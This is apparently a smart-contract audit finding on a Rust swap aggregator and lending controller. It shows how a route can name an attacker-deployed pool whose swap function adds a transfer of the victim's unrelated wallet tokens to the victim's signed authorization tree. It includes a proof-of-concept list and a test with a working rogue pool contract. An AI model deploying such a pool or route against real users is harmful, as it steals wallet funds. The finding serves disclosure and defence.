### Title

Unauthenticated route-selected pool code can inject token transfers into the caller's authorization tree - (File: contracts/swap-aggregator/src/execute/mod.rs)

### Summary

A crafted `StrategySwap` route can cause router-invoked venue code to execute under a transaction whose root authorization belongs to the lending user, and that code can request additional token transfers from the user's wallet. [1](#0-0) [2](#0-1)  The controller's measured input/output checks bound only the controller-held swap input and output; they do not prevent a route-selected contract from adding unrelated caller-authorized token transfers to the authorization tree. [3](#0-2) [2](#0-1) 

### Finding Description

The command-injection class maps to the strategy payload's ability to select pool addresses that the router subsequently invokes. [4](#0-3) [5](#0-4)  For example, an Aquarius hop invokes `pool.swap`, a Phoenix hop invokes `pool.swap`, and a Sushi hop invokes `pool.swap` at the route-supplied `hop.pool` address. [6](#0-5) [7](#0-6) [8](#0-7) 

The strongest lending entrypoint is `swap_collateral(caller, account_id, current, from_amount, new, swap)`, where `caller` authorizes the operation and `swap` is passed to the router. [9](#0-8) [10](#0-9)  Other reachable strategy paths carrying user-supplied swap bytes, including `multiply`, can exercise the same router boundary. [11](#0-10) 

`execute_strategy` authenticates the controller as `sender`, decodes the route, pulls the controller's input token, and executes every encoded operation. [1](#0-0) [12](#0-11)  The malicious pool can invoke an unrelated token's `transfer(victim, attacker, amount)`; an honest simulation records that invocation as a child of the victim's root authorization, and enforcing mode executes it if the victim signs the returned tree. [2](#0-1) [13](#0-12) 

### Impact Explanation

A route can steal wallet assets unrelated to the collateral being swapped, not merely consume the intended `token_in` amount. [2](#0-1)  The regression test demonstrates a route that transfers the victim's entire unrelated wallet-token balance to the attacker while still delivering the expected swap output to the victim's position. [14](#0-13)  The same test shows the transfer succeeds in enforcing authorization mode when the poisoned child invocation is included in the signed tree. [15](#0-14) 

### Likelihood Explanation

A victim must sign or authorize the transaction containing the route, so this is not fully unauthenticated execution. [16](#0-15)  However, an unprivileged attacker can deploy a compatible pool contract and provide or induce use of a crafted route whose venue calls create an authorization tree containing extra user-token transfers. [17](#0-16) [18](#0-17)  The project's own threat model states that clients must decode the route and reject any authorization child beyond the expected transfer, confirming that this is a reachable authorization-tree injection rather than a purely theoretical pool failure. [2](#0-1) 

### Recommendation

Restrict route venue contracts to reviewed or allowlisted pools for production strategies, or execute venue calls through a router context that cannot attach user-token transfers beneath the user's root authorization. [19](#0-18) [2](#0-1)  At minimum, simulation and signing clients must reject any `AuthorizedInvocation` child under lending/router calls other than the expected token input transfer and must surface exact child contract, function, `from`, `to`, and amount fields before signing. [20](#0-19) 

### Proof of Concept

1. The attacker deploys a pool-compatible contract at `hop.pool`; its `swap` implementation calls `token::Client::transfer(victim, attacker, wallet_balance)` for an unrelated token held by the victim. [21](#0-20) 
2. The victim calls `swap_collateral` with their own `caller`, an owned `account_id`, a listed `current` collateral, positive `from_amount`, a listed `new` collateral, and a `swap` payload containing the malicious pool address. [22](#0-21) 
3. The controller authorizes only its own exact input transfer and calls `router.execute_strategy(controller, amount_in, swap)`, then checks only the controller's measured spend and output. [23](#0-22) 
4. The router decodes the payload and dispatches the route-selected venue, which invokes the malicious pool's `swap` function. [24](#0-23) [19](#0-18) 
5. The malicious transfer is recorded as a child of the victim's `swap_collateral` authorization. [25](#0-24) 
6. If the victim signs the poisoned authorization tree, the unrelated wallet token moves from the victim to the attacker while the victim still receives the expected swap output. [15](#0-14)

### Citations

**File:** contracts/swap-aggregator/src/execute/mod.rs (L51-64)
```rust
pub(crate) fn run(env: Env, sender: Address, total_in: i128, payload: StrategyPayload) -> i128 {
    sender.require_auth();

    if total_in <= 0 {
        panic_with_error!(&env, Error::InvalidAmount);
    }

    let StrategyPayload {
        amounts,
        assets,
        ops,
    } = payload;
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());

```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L76-118)
```rust
    // Credit the measured delta, not declared `total_in`: a fee-on-transfer
    // input would otherwise draw the shortfall from the fee reserve.
    let credited_in = transfer_amount_measured(
        &env,
        &input_token,
        &sender,
        &router,
        total_in,
        GenericError::AmountMustBePositive,
    );
    vault.deposit(&input_token, credited_in);

    let referral_id = program.referral_id;
    let fee_on_input = if referral_id != 0 {
        let list = storage::load_whitelist(&env);
        let in_wl = list.contains(&input_token);
        let out_wl = list.contains(&output_token);

        !out_wl || in_wl
    } else {
        false
    };

    if fee_on_input {
        fees::apply_fees_on_token(&env, &mut vault, &input_token, referral_id);
    }

    let ctx = Ctx {
        env: &env,
        router: &router,
        assets: &assets,
        amounts: &amounts,
        program: &program,
    };
    let mut prev: PrevOutput = None;
    for i in 0..program.len() {
        prev = execute_op(
            &ctx,
            &mut vault,
            program.op(&env, i),
            prev,
            &mut tokens_cache,
        );
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** contracts/controller/src/strategies/swap.rs (L29-54)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/program.rs (L94-118)
```rust
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Opcode {
    /// Swap through `venue`: `idx_a` pool, `idx_b` token in, `idx_c` token out.
    Swap(SwapVenue),
    /// Aquarius withdraw: `idx_a` pool, `idx_b` share token, `idx_c` first
    /// index of the per-constituent floor run in `amounts`.
    Burn,
    /// Aquarius deposit: `idx_a` pool, `idx_b` share token, `idx_c` index of
    /// the minimum share count in `amounts`.
    Mint,
}

impl Opcode {
    /// Decodes an opcode byte into its variant, or `None` if unrecognized.
    fn from_u8(value: u8) -> Option<Self> {
        match value {
            0 => Some(Self::Swap(SwapVenue::Soroswap)),
            1 => Some(Self::Swap(SwapVenue::Aquarius)),
            2 => Some(Self::Swap(SwapVenue::Phoenix)),
            3 => Some(Self::Swap(SwapVenue::Sushi)),
            4 => Some(Self::Swap(SwapVenue::CometDex)),
            5 => Some(Self::Burn),
            6 => Some(Self::Mint),
            _ => None,
        }
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L23-40)
```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** contracts/swap-aggregator/src/venues/aquarius/pool.rs (L16-35)
```rust
pub(super) fn invoke_pool_swap(
    env: &Env,
    router: &Address,
    pool: &Address,
    token_in: &Address,
    in_idx: u32,
    out_idx: u32,
    amount_in: i128,
) {
    authorize_token_transfer(env, token_in, router, pool, amount_in);
    let args: Vec<Val> = vec![
        env,
        router.into_val(env),
        in_idx.into_val(env),
        out_idx.into_val(env),
        to_u128(env, amount_in).into_val(env),
        0_u128.into_val(env),
    ];
    let _: u128 = env.invoke_contract(pool, &symbol_short!("swap"), args);
}
```

**File:** contracts/swap-aggregator/src/venues/phoenix.rs (L11-25)
```rust
pub(crate) fn swap(ctx: &HopContext<'_>) {
    let args: Vec<Val> = vec![
        ctx.env,
        ctx.router.into_val(ctx.env),
        ctx.hop.token_in.into_val(ctx.env),
        ctx.amount_in.into_val(ctx.env),
        Option::<i128>::None.into_val(ctx.env),
        Option::<i64>::None.into_val(ctx.env),
        Option::<u64>::None.into_val(ctx.env),
        Option::<i64>::None.into_val(ctx.env),
    ];
    ctx.authorize_pool_pull();
    let _: i128 = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** contracts/swap-aggregator/src/venues/sushi.rs (L37-50)
```rust
    ctx.authorize_pool_pull();

    let args: Vec<Val> = vec![
        ctx.env,
        ctx.router.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
        zero_for_one.into_val(ctx.env),
        ctx.amount_in.into_val(ctx.env),
        price_limit.into_val(ctx.env),
        hints,
    ];
    let _: Val = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &Symbol::new(ctx.env, "swap"), args);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L27-64)
```rust
pub(crate) fn process_swap_collateral(
    env: &Env,
    caller: &Address,
    params: SwapCollateralParams<'_>,
) {
    let SwapCollateralParams {
        account_id,
        current,
        from_amount,
        new,
        swap,
    } = params;

    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/lib.rs (L219-238)
```rust
    /// Borrows `debt_to_flash_loan`, swaps into `collateral` and deposits the
    /// proceeds. An `initial_payment` in collateral joins the deposit; one in debt
    /// joins `swap`; a third asset requires `convert_swap` or reverts with
    /// `ConvertStepsRequired`. Returns the account id; `account_id = 0` creates it.
    /// An existing account requires owner or delegate authorization and a matching mode.
    #[when_not_paused]
    fn multiply(
        env: Env,
        caller: Address,
        account_id: u64,
        spoke_id: u32,
        collateral: HubAssetKey,
        debt_to_flash_loan: i128,
        debt: HubAssetKey,
        mode: PositionMode,
        swap: Bytes,
        initial_payment: Option<(HubAssetKey, i128)>,
        convert_swap: Option<Bytes>,
    ) -> u64 {
        strategies::multiply::process_multiply(
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-71)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
